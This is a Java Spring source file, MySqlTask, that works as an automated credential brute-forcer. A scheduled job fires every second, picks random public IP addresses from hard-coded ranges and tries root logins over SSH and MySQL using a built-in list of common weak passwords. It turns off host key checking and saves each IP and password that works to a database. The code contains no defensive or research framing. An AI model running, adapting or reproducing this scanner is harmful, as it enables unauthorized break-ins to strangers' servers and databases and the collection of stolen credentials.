package com.teachy.coins.tasks.mysql;

import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;
import com.teachy.coins.infrastructure.persistence.HostsDao;
import com.teachy.coins.model.bo.HostsBo;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.sql.Connection;
import java.sql.DriverManager;
import java.util.Arrays;
import java.util.List;
import java.util.Properties;
import java.util.Random;


//@Component
@Slf4j
public class MySqlTask {

    @Autowired
    private HostsDao hostsDao;
    Connection conn = null;

    private static final String USER = "root";
    List<String> checkList = Arrays.asList("root", "123456", "admin", "admin123", "admin123456", "root123",
            "root123456", "12345678", "Admin", "admin@123", "12345", "123456789", "test1", "password", "zinch",
            "asdf", "qwerty", "iloveyou", "abc123", "111111", "123123", "test", "root@123");

    @Scheduled(cron = "*/1 * * * * ?")
    public void doTask() {
        try {
            getConnection();
        } catch (Exception e) {
            log.info("网络错误");
        }
    }

    public void getConnection() {
        String ip = getRandomIp();
        connecHost(ip);
        connecMysql(ip);
    }

    public void insert(String ip, String pass, boolean isHost) {
        HostsBo hostsBo = hostsDao.selectByIp(ip);
        if (hostsBo == null) {
            hostsBo = new HostsBo();
            hostsBo.setIp(ip);
            deal(hostsBo, pass, isHost);
            hostsDao.insert(hostsBo);
        } else {
            deal(hostsBo, pass, isHost);
            hostsDao.update(hostsBo);
        }
    }

    public void deal(HostsBo hostsBo, String pass, boolean isHost) {
        if (isHost) {
            hostsBo.setPasswordHost(pass);
        } else {
            hostsBo.setPasswordMysql(pass);
        }
    }

    public void connecHost(String ip) {
        int port = 22;
        for (String pass : checkList) {
            // 创建JSch
            JSch jSch = new JSch();
            // 获取session
            Session session = null;
            try {
                session = jSch.getSession("root", ip, port);
                session.setPassword(pass);
                session.setTimeout(1000);
                Properties prop = new Properties();
                prop.put("StrictHostKeyChecking", "no");
                session.setConfig(prop);
                session.connect();
                System.out.println("1");
                insert(ip, pass, true);
                break;
            } catch (JSchException e) {
                if (e.getMessage().contains("fail")) {
                    continue;
                } else {
                    break;
                }
            }
        }
    }

    public void connecMysql(String ip) {
        for (String pass : checkList) {
            try {
                Class.forName("com.mysql.cj.jdbc.Driver");
                String url = "jdbc:mysql://" + ip + ":3306/mysql?useSSL=false&connectTimeout=1500&socketTimeout=1500&&serverTimezone=UTC";
                conn = (Connection) DriverManager.getConnection(url, USER, pass); //创建连接
                insert(ip, pass, false);
                System.out.println("2");
                break;
            } catch (Exception e) {
                if (e.getMessage().contains("YES")) {
                    continue;
                } else {
                    break;
                }
            }
        }
    }

    public static String getRandomIp() {
        int[][] range = {{607649792, 608174079}, // 36.56.0.0-36.63.255.255
                {1038614528, 1039007743}, // 61.232.0.0-61.237.255.255
                {1783627776, 1784676351}, // 106.80.0.0-106.95.255.255
                {2035023872, 2035154943}, // 121.76.0.0-121.77.255.255
                {2078801920, 2079064063}, // 123.232.0.0-123.235.255.255
                {-1950089216, -1948778497}, // 139.196.0.0-139.215.255.255
                {-1425539072, -1425014785}, // 171.8.0.0-171.15.255.255
                {-1236271104, -1235419137}, // 182.80.0.0-182.92.255.255
                {-770113536, -768606209}, // 210.25.0.0-210.47.255.255
                {-569376768, -564133889}, // 222.16.0.0-222.95.255.255
        };

        Random rdint = new Random();
        int index = rdint.nextInt(10);
        String ip = num2ip(range[index][0] + new Random().nextInt(range[index][1] - range[index][0]));
        return ip;
    }

    /*
     * 将十进制转换成IP地址
     */
    public static String num2ip(int ip) {
        int[] b = new int[4];
        String x = "";
        b[0] = (int) ((ip >> 24) & 0xff);
        b[1] = (int) ((ip >> 16) & 0xff);
        b[2] = (int) ((ip >> 8) & 0xff);
        b[3] = (int) (ip & 0xff);
        x = Integer.toString(b[0]) + "." + Integer.toString(b[1]) + "." + Integer.toString(b[2]) + "." + Integer.toString(b[3]);

        return x;
    }

    public static void writeLocalStrOne(String str, String path) {
        try {
            File file = new File(path);
            if (!file.getParentFile().exists()) {
                file.getParentFile().mkdirs();
            }
            file.createNewFile();
            if (str != null && !"".equals(str)) {
                FileWriter fw = new FileWriter(file, true);
                fw.write(str);//写入本地文件中
                fw.flush();
                fw.close();
                System.out.println("执行完毕!");
            }
        } catch (IOException e) {
            e.printStackTrace();
        }

    }

    public static void method2(String file, String conent) {
        BufferedWriter out = null;
        try {
            out = new BufferedWriter(new OutputStreamWriter(
                    new FileOutputStream(file, true)));
            out.write(conent + "\r\n");
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                out.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}